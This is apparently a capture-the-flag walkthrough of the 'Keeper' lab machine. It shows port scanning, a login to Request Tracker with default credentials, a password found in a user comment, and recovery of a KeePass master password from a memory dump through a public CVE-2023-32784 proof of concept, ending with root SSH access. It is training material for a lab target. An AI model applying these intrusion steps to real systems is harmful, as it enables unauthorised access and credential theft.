# Keeper - OSCP-Style Walkthrough

**Date:** 17th December 2023  
**Machine Author:** Knightmare  
**Difficulty:** Easy

---

## Synopsis
Keeper is an easy Linux machine with a support ticketing system using default credentials. Enumeration reveals cleartext credentials for SSH. SSH access gives a KeePass database dump, which is exploited to retrieve the master password and root SSH keys for privilege escalation.

---

## Skills Required
- Basic web enumeration
- Linux enumeration

## Skills Learned
- KeePass exploitation

---

## Enumeration

### Nmap
```sh
ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.11.227 | grep '^[0-9]' | cut -d'/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -Pn -sC -sV 10.10.11.227
```
- Ports open: 22 (SSH), 80 (HTTP)

### HTTP
- Visit `http://10.10.11.227` → hyperlink to `tickets.keeper.htb`
- Add to `/etc/hosts`:
  ```sh
  echo "10.10.11.227 tickets.keeper.htb keeper.htb" | sudo tee -a /etc/hosts
  ```
- Login page: Request Tracker (RT)
- Default creds: `root:password`
- Login successful

---

## Foothold
- Admin > user: users `lnorgaard` and `root`
- User `lnorgaard` has password in comment: `Welcome2023!`
- SSH as lnorgaard:
  ```sh
  ssh lnorgaard@10.10.11.227
  cat /home/lnorgaard/user.txt
  unzip RT30000.zip
  ```
- Find: `KeePassDumpFull.dmp` and `passcodes.kdbx`

---

## Privilege Escalation

### KeePass Master Password Extraction
- Google: "keepass master password vulnerabilities" → CVE-2023-32784
- Use PoC: https://github.com/vdohney/keepass-password-dumper
- Steps:
  ```sh
  scp lnorgaard@10.10.11.227:/home/lnorgaard/RT30000.zip .
  git clone https://github.com/vdohney/keepass-password-dumper.git
  cd keepass-password-dumper
  dotnet run /path/to/KeePassDumpFull.dmp
  ```
- Output: probable master password `dgrød med fløde`
- Try with `kpcli` (install if needed):
  ```sh
  sudo apt-get install kpcli -y
  kpcli
  ```
- If password fails, Google for correct spelling: `rødgrød med fløde` (works)

### KeePass Database Access
- Open `passcodes.kdbx` in `kpcli` with password `rødgrød med fløde`
- Navigate:
  ```
  ls
  cd passcodes
  cd Network
  show 0 -f
  ```
- Find PuTTY-formatted SSH private key for root

## Alternative: Using PuTTY GUI
- Launch PuTTY
- Session: set IP
- Auth > Credentials: set path to PuTTY key
- Login as `root`
- Get `/root/root.txt`

---

## Key Takeaways
- Always check for default credentials
- Enumerate all user comments/fields for passwords
- Use memory dump vulnerabilities for password extraction
- Know how to convert and use different SSH key formats
